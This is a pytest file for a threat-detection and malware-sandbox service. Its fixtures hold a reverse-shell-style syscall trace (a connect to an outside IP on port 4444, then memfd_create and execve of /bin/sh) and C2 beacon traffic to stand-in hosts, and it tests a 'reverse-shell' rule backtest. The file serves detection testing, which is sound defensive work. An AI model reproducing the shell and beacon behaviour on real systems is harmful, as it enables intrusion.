import pytest
from fastapi.testclient import TestClient
from ..main import app
from ..core.db import db_session
from ..services.dynamic_sandbox import extract_syscalls_from_trace, extract_c2_sinkhole_events
from ..services.detection import backtest_rule
from ..services.report import synthesize_investigation_narrative
from ..models import investigation as inv_store

client = TestClient(app)


def test_extract_syscalls_and_sinkhole():
    trace = """
    [pid 1234] openat(AT_FDCWD, "/tmp/implant", O_RDONLY) = 3
    [pid 1234] connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("185.220.101.5")}, 16) = 0
    [pid 1234] memfd_create("payload", 0) = 4
    [pid 1234] execve("/bin/sh", ["/bin/sh"], 0x7ffd) = 0
    """
    syscalls = extract_syscalls_from_trace(trace)
    assert len(syscalls) >= 3
    assert any(s["syscall"] == "openat" for s in syscalls)
    assert any(s["syscall"] == "connect" for s in syscalls)
    assert any(s["syscall"] == "memfd_create" for s in syscalls)

    stdout = """
    Connecting to http://c2.evil-corp.com:8080/beacon.php
    POST /beacon.php HTTP/1.1
    Host: c2.evil-corp.com
    Resolving darknet.payloads.org
    """
    sinkhole = extract_c2_sinkhole_events(stdout, "")
    assert len(sinkhole) >= 2
    assert any(s["type"] == "dns_query" for s in sinkhole)
    assert any(s["type"] == "http_request" for s in sinkhole)


def test_rule_backtest_endpoint():
    resp = client.post("/rules/reverse-shell/backtest?max_events=500")
    assert resp.status_code == 200
    data = resp.json()
    assert data["rule_id"] == "reverse-shell"
    assert "events_scanned" in data
    assert "matches_count" in data
    assert "estimated_fp_risk" in data


def test_investigation_synthesize_endpoint():
    with db_session() as conn:
        inv = inv_store.create(conn, "Advanced Threat Campaign Investigation", "analyst", ["malware", "apt"])
        inv_id = inv["id"]

    resp = client.post(f"/investigations/{inv_id}/synthesize")
    assert resp.status_code == 200
    data = resp.json()
    assert data["investigation_id"] == inv_id
    assert "executive_summary" in data
    assert "remediation_checklist" in data
    assert len(data["remediation_checklist"]) > 0
